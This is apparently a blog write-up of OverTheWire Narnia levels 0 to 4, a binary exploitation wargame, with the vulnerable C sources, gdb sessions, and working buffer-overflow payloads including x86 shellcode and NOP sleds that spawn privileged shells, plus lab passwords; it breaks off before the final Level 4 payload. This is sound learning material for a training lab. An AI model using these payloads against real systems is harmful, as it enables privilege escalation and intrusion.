---
layout: single
title: "OverTheWire - Narnia"
show_excerpt: false
toc: true
toc_sticky: true
toc_label: "Levels"
date: 2024-04-16
classes: single
header:
  teaser: /assets/images/avatarpng.png
  teaser_home_page: true
  icon: /assets/images/avatarpng.png
related: true
categories:
  - CTF
tags:
  - Binary Exploitation
  - C
---

**Narnia** wargame

``` ruby
Difficulty:     2/10
Levels:         10
Platform:   Linux/x86
data: Data for the levels can be found in /narnia/.
passwords: Passwords for each level are at /etc/narnia_pass/
```

**description:** This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.

ssh narniaX@narnia.labs.overthewire.org -p 2226

## Level 0

The code:
```c
int main(){

    long val=0x41414141;
    char buf[20];
  

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);
  

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);


    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
  

    return 0;
}
```

We have a type long variable named val. It's value is 0x41414141 which is "AAAA".
Now, the program calls scanf() to receive an input from the user and checks if this input equals to 0xdeadbeef. Since the bytes 0xde 0xad 0xbe 0xef are not ascii letters, we need to find a way to send these bytes to the program.

The program first initiates val, and then a buffer of 20 bytes. The operating system saves variables and other program data in stack based data types.
This means that first 'long' type is pushed to the stack, which are 32 bits or DW (4 Bytes). and then pushes to the stack another 20 bytes for the buffer variable. This allows us, the user, to overflow val! since scanf() allows us to input 24 chars, this is probably the way they intended us to do it.

```python
from pwn import *
import os

argv=["/narnia/narnia0"]

r1, w1 = os.pipe()
os.write(w1, b"\x41"*20 + b'\xef\xbe\xad\xde')

io = process(executable = '/narnia/narnia0', argv = argv, stdin=r1)

io.interactive()
```

But my problem here is that i cant communicate with the service.

or
```ruby
(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat ;) | ./narnia0
```
After reading online, adding the cat command helps with keeping the called /bin/bash by the program

## Level 1

```c
int main(){
    int (*ret)();
  

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }
  

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
  

    return 0;
}
```

In this challenge the program declares an int function pointer called ret. Then, it checks for an env variable "EGG". If there is no such variable, then the program will exit.
else, it will set the ret pointer to whatever EGG is holding, and run it.

My thought process:
1. Create a function that reads the flag file at /etc/narnia_pass/narnia1
2. Get that function's address
3. set $EGG to be memory location my function starts at.
4. Be happy :)

### First try
First I created a small C program that prints "Hey Dude!" and exits.
```c
#include <stdio.h>
int main()
{
printf("Hey Dude!");
return 0;
}
```

This is just to check if i can access this function from another process.

using [[nm]] I can locate the address of the entry point of the function.

```ruby
narnia1@gibson:/tmp/nir1$ nm sol1
<code snipped>
0000000000001000 T _init
0000000000002000 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
                 U __libc_start_main@GLIBC_2.34
00000000000012f1 T main
                 U printf@GLIBC_2.2.5
0000000000001180 t register_tm_clones
0000000000004010 D __TMC_END__
```

As we can see the main() function is located at 0x00000000000012f1 in the memory.

So lets create an environment variable EGG with this address as a value, and run the program!

```ruby
narnia1@gibson:/narnia$ export EGG=0x00000000000012f1
narnia1@gibson:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault (core dumped)
```

This does not work....
we get segmentation fault which is a common error in programming languages like C and C++. It occurs when a program tries to access memory that it doesn't have permission to access.
### Second try
This time, I will try to change the value of \*ret function ptr to hold the address of my newly created function.
I will use [[GDB]] for this one to examine and change memory
Tried it, same.

I'm looking at a writeup!

OK. so I read a write up, and I was a bit off. I should not load another function, as I will cause a segmentation fault, as happened. What I should do is to run shell code within the program's memory. okay, lets do so.

### Third try - Shell code

For this one, we will use make the function pointer run [[Shellcode]] and spawn a shell.
To start, let's figure out the architecture and version of the OS
```ruby
narnia1@gibson:/narnia$ uname -a
Linux gibson 6.2.0-1012-aws 12~22.04.1-Ubuntu SMP Thu Sep  7 14:01:24 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

As we can see, the host runs Linux gibson 6.2.0-1012-aws x86-64 architecture which is x86 architecture for 64 bytes.

Now let's find us a shellcode and work with it.
Say we use this shellcode found in shell-storm
```C
"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
```

Now we need to set EGG to hold this value. Since these are bytes that we are trying to write into EGG, we need to format them correctly.
For this, we need to use a concept called [[Command substitution]]. For our case, we will use echo to format the string as needed.

```ruby
export EGG=$(echo -n -e "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")
```

Let's try this:

```ruby
narnia1@gibson:/narnia$ export EGG=$(echo -n -e "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")
narnia1@gibson:/narnia$ env
<code snipped>
EGG=EGG=?^1ɱ!?l???u???????k

                       Y?Sgi.q??Skii0cbti0cjo??SRT??΁
```
This looks promising! let's run the program.

```ruby
narnia1@gibson:/narnia$ ./narnia1
Trying to execute EGG!
bash-5.1$ whoami
narnia2
bash-5.1$ cat /etc/narnia_pass/narnia2
Zzb6MIyceT
```
Success! The password for the next level is: Zzb6MIyceT.

>Now let's take some time to understand how it works.
   I want to see how the shellcode looks inside the program. So let's fire up gdb and inspect the memory.

```ruby
(gdb) disas main
Dump of assembler code for function main:
   0x08049196 <+0>: push   ebp
   0x08049197 <+1>: mov    ebp,esp
   0x08049199 <+3>: sub    esp,0x4
   0x0804919c <+6>: push   0x804a008
   0x080491a1 <+11>: call   0x8049050 <getenv@plt>
   0x080491a6 <+16>: add    esp,0x4
   0x080491a9 <+19>: test   eax,eax
   0x080491ab <+21>: jne    0x80491c1 <main+43>
   0x080491ad <+23>: push   0x804a00c
   0x080491b2 <+28>: call   0x8049060 <puts@plt>
   0x080491b7 <+33>: add    esp,0x4
   0x080491ba <+36>: push   0x1
   0x080491bc <+38>: call   0x8049070 <exit@plt>
   0x080491c1 <+43>: push   0x804a041
   0x080491c6 <+48>: call   0x8049060 <puts@plt>
   0x080491cb <+53>: add    esp,0x4
   0x080491ce <+56>: push   0x804a008
   0x080491d3 <+61>: call   0x8049050 <getenv@plt>
   0x080491d8 <+66>: add    esp,0x4
   0x080491db <+69>: mov    DWORD PTR [ebp-0x4],eax
   0x080491de <+72>: mov    eax,DWORD PTR [ebp-0x4]
   0x080491e1 <+75>: call   eax
   0x080491e3 <+77>: mov    eax,0x0
   0x080491e8 <+82>: leave  
   0x080491e9 <+83>: ret
```

I will break at main+75 and look what the memory holds at $eax.
Now lets see how it looks in memory:
```Ruby
(gdb) x/50xb $eax
0xffffde7e: 0xeb 0x11 0x5e 0x31 0xc9 0xb1 0x21 0x80
0xffffde86: 0x6c 0x0e 0xff 0x01 0x80 0xe9 0x01 0x75
0xffffde8e: 0xf6 0xeb 0x05 0xe8 0xea 0xff 0xff 0xff
0xffffde96: 0x6b 0x0c 0x59 0x9a 0x53 0x67 0x69 0x2e
0xffffde9e: 0x71 0x8a 0xe2 0x53 0x6b 0x69 0x69 0x30
0xffffdea6: 0x63 0x62 0x74 0x69 0x30 0x63 0x6a 0x6f
0xffffdeae: 0x8a 0xe4
```

Great! this is our shellcode! It works just as expected.

## Level 2

I was stuck on this challenge for over two weeks, because I couldn't find a shellcode that will work. After numerous tries I found one that worked. The writeup for this level will be partial because I could stand another second of it.

The code for this challenge is:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
  
int main(int argc, char * argv[]){
    char buf[128];
  
    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);
  
    return 0;
}
```

At first glance, this looks like another buffer overflow attack. the program initializes a buffer of 128 bytes, and copies user argument input into it. Let's find out how we hack it.

let's give the program an input larger than 128 bytes and see how it acts.
Using common buffer overflow tool, i generated a 150 chars that follow a pattern so i could locate which bytes are the trouble makers.

```ruby
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Starting program: /narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

<code snipped>
Program received signal SIGSEGV, Segmentation fault.
0x41346541 in ?? ()
```

As we can see the EIP register is overwritten with `0x41346541` which is a `A4eA`. This string is at offset 132 in our pattern. 

This means that the bytes from 132 to 136 will hold the memory address of the instruction we want to run. 

Great, now we need to inject a shellcode into the memory, and make EIP point to it. let's use GDB again to locate the memory address our buffer is at.

```ruby
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<code snipped>

(gdb) x/300xw $esp
<code snipped>
0xffffd63c: 0x00000019 0xffffd66b 0x0000001a 0x00000002
0xffffd64c: 0x0000001f 0xffffdfe8 0x0000000f 0xffffd67b
0xffffd65c: 0x00000000 0x00000000 0x00000000 0xbd000000
0xffffd66c: 0xf69da5cf 0x799005bc 0x7a6a395f 0x69bb45b1
0xffffd67c: 0x00363836 0x00000000 0x616e2f00 0x61696e72
0xffffd68c: 0x72616e2f 0x3261696e 0x41414100 0x41414141
0xffffd69c: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6ac: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6bc: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6cc: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6dc: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6ec: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd6fc: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd70c: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd71c: 0x41414141 0x41414141 0x41414141 0x00414141
0xffffd72c: 0x4c454853 0x622f3d4c 0x622f6e69 0x00687361
<code snipped>
```

As we can see the buffer starts at approximately 0xffffd69c.
Since memory location may change from run to run, we should use a `nop sled` and approximate the memory location when running the program. Using the `nop sled` will allow us to bot be as accurate, and while we land in 100 byte range `0xffffd69c - 0xffffd272e` we will slide right into our shellcode.

Since the machine is x86-64 linux architecture, we could use [this shellcode](https://arc.net/l/quote/lfgmuqgm) .
```ruby
\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

Filling the shellcode with nops will provide us the following string.
And indeed this string does cause a buffer overflow!

```ruby
**narnia2@gibson**:**/narnia**$ ./narnia2 $(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x90\x90\x90\x90\xe0\xd6\xff\xff")
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
8SyQ2wyEDU
```

## Level 3

The source code for this challenge is:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
  
int main(int argc, char **argv){
  
    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];
  
    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }
  
    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }
    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
  
    /* close 'em */
    close(ifd);
    close(ofd);
  
    exit(1);
}
```

From what we can understand, the program opens a file that is given with argv, reads it, and writes it content into ofd, which in our case is /dev/null.
So basically it reads a file and writes it to a null file. 

Looks like another type of buffer overflow, but this time we would like to overwrite the value of `ofile`. 

To do this, we could use [[ltrace]] and play with some inputs, and see what input overwrites `ofile`. I see that the program uses `strcpy()` function of `argv[1]` to `ifile`. Since `ifile` was initialized after `ofile`, the stack will hold `ifile` in lower memory address than `ofile`. This means a buffer overflow could overwrite the value of `ofile`.

Okay, let's try to run the code with some parameters to see how it acts.
The most obvious is to run with the password file of narnia4

```ruby
narnia3@gibson:/narnia$ ./narnia3 /etc/narnia_pass/narnia4
copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)
```

Okay we see the program works as expected, and copies the content of `/etc/narnia_pass/narnia4` to `/dev/null`

Let's try to give it a bigger string:

```ruby
**narnia3@gibson**:**/narnia**$ ./narnia3 $(python3 -c "print('/etc/narnia_pass/narnia4' +'\x30' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A')")

error opening a2Aa3Aa4Aa5Aa6Aa7Aa8????b0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Great! we get an output that says that the program could not open `a2Aa3..` . But the question is what did we override? is it `ifile` or `ofile` ?
Using ltrace we find out that we successfully overwrote `ofile`!

```ruby
**narnia3@gibson**:**/narnia**$ ltrace ./narnia3 $(python3 -c "print('/etc/narnia_pass/narnia4' +'\x00' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A')")
-bash: warning: command substitution: ignored null byte in input
__libc_start_main(0x80491d6, 2, 0xffffd564, 0 <unfinished ...>
strcpy(0xffffd470, "/etc/narnia_pass/narnia4Aa0Aa1Aa"...)     = 0xffffd470
open("2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A"..., 2, 00)            = -1
printf("error opening %s\n", "2Aa3Aa4Aa5Aa6Aa7Aa8A\377\377\377\3770Ab1Ab2A"...error opening 2Aa3Aa4Aa5Aa6Aa7Aa8A????0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
) = 107
exit(-1 <no return ...>
+++ exited (status 255) +++
```

> We can see from the code snippet above that right after `strcpy()`, the program calls `open()` and fails. The first `open()` of the program is responsible for opening `ofile`.

Let's overflow `ofile` with a valid file.
First let's create a file in the `/tmp/` directory.

```ruby
ltrace ./narnia3 $(python3 -c "print('/etc/narnia_pass/narnia4' +'\x00' + 'Aa0Aa1A/tmp/sol3/pass' + '\x00')")

-bash: warning: command substitution: ignored null byte in input

__libc_start_main(0x80491d6, 2, 0xffffd5b4, 0 <unfinished ...>
strcpy(0xffffd4c0, "/etc/narnia_pass/narnia4\001Aa0Aa1A"...)  = 0xffffd4c0
open("/tmp/sol3/pass", 2, 00)                                 = 3
open("/etc/narnia_pass/narnia4\001Aa0Aa1A"..., 0, 00)         = -1
printf("error opening %s\n", "/etc/narnia_pass/narnia4\001Aa0Aa1A"...error opening /etc/narnia_pass/narnia4Aa0Aa1A/tmp/sol3/pass
) = 61
exit(-1 <no return ...>

+++ exited (status 255) +++
```

We can successfully overwrite and open `/tmp/sol3/pass`, and we see that `ifile` gets the entire string, and `open()` tries to open that path.

So let's give `ifile` a valid file path, that will also overflow and overwrite `ofile` with a valid file.
here is what are going to do:
1. Call ./narania3 with a 45 bytes string
2. The 45 length string will be what `ifile` will try to open. `ifile` is the file where the password should be stored. So we will create a symbolic link to the password file from our tmp directory.
3. We start overflowing `ofile` from byte 32, so we got to make sure that from this byte and on the path is of a valid file.


**First lets create the `ofile` path**
```ruby
narnia3@gibson:/narnia$ mkdir /tmp/sol3
narnia3@gibson:/narnia$ touch /tmp/sol3/pass
```

This is the file `ofile` will open after the overflow.

**Now let's create the `ifile` path**
```ruby
narnia3@gibson:/narnia$ mkdir /tmp/sol3/passAAAAAAAAAAAa0Aa1AA/tmp/sol3
narnia3@gibson:/narnia$ ln -s /etc/narnia_pass/narnia4  /tmp/sol3/passAAAAAAAAAAAa0Aa1AA/tmp/sol3/pass
```
Here we created a symbolic link between the password file a `/etc/narnia_pass/ `and the file in the tmp folder.


Let's run the program with the correct string!

```ruby
narnia3@gibson:/narnia$ ./narnia3 /tmp/sol3/passAAAAAAAAAAAa0Aa1AA/tmp/sol3/pass
copied contents of /tmp/sol3/passAAAAAAAAAAAa0Aa1AA/tmp/sol3/pass to a safer place... (/tmp/sol3/pass)
narnia3@gibson:/narnia$ cat /tmp/sol3/pass
aKNxxrpDc1
```

Success!

## Level 4

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
  
extern char **environ;
  
int main(int argc,char **argv){
    int i;
    char buffer[256];
  
    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
  
    if(argc>1)
        strcpy(buffer,argv[1]);
  
    return 0;
}
```

Looking at the code we can see that the program defines a buffer variable with length of 256 bytes. Then, the program set's all environment variables to Null. Seems like the program doesn't want any env vars affecting it's run.

Next, the program check whether the user has entered an argument to the program, and copies it's value using `strcpy()` to the buffer variable, without checking for the length of the input. This means we could implement a buffer overflow attack!

Okay, let's fire up gdb and start hacking :)

```ruby
(gdb) b *main+131
Breakpoint 1 at 0x8049219

(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Starting program: /narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

[Thread debugging using libthread_db enabled]

Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x08049219 in main ()
(gdb) si
0x41386941 in ?? ()
```

Breaking right before the main function returns, to make the program pop the last item on the stack. Now, after stepping one instruction with `si`, we see that that `EIP` is pointing to `0x41386941` which is `Ai8A`. This string is at offset 264. This means that after 264 bytes we can override EIP.

All we have left now, is to find a suitable shellcode, fill the first 264 bytes with nop codes and the shellcode and then locate the memory address of our injected string.

We will use the shellcode that was used for solving Narnia2. A 34 byte shellcode.
```ruby
\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

Now, we will generate the nop sled.
```python
>>> print("\\x90"*(263-34))
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
```

Great, let's put it all together with four B's that will override EIP.

```ruby
$(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x42\x42\x42\x42")
```

Let's run gdb and see what we get:

```ruby
(gdb) r $(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x42\x42\x42\x42")

The program being debugged has been started already.

Breakpoint 1, 0x08049219 in main ()

(gdb) si

0x42424242 in ?? ()
```

Great, we overwrote EIP successfully with four B's, now lets find the memory address of our payload:

```ruby
(gdb) x/300xw $esp
<code snipped>
0xffffd610: 0x61696e72 0x72616e2f 0x3461696e 0x90909000
0xffffd620: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd630: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd640: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd650: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd660: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd670: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd680: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd690: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6a0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6b0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6c0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6d0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6e0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd6f0: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffd700: 0x316a9090 0xcdd23158 0x89c38980 0x58466ac1
0xffffd710: 0x0bb080cd 0x2f6e6852 0x2f686873 0x8969622f
0xffffd720: 0xcdd189e3 0x42424280 0x00000042 0x00000000
<code snipped>
```

As we can see, the nop sled starts at around `0xffffd620` and goes up to `0xffffd710`.
We can choose a safe place in the middle, let's say `0xffffd6a0`, and set EIP to it.

`0xffffd6a0` - > `'\xa0\xd6\xff\xff`

The final payload will look like this:
```ruby
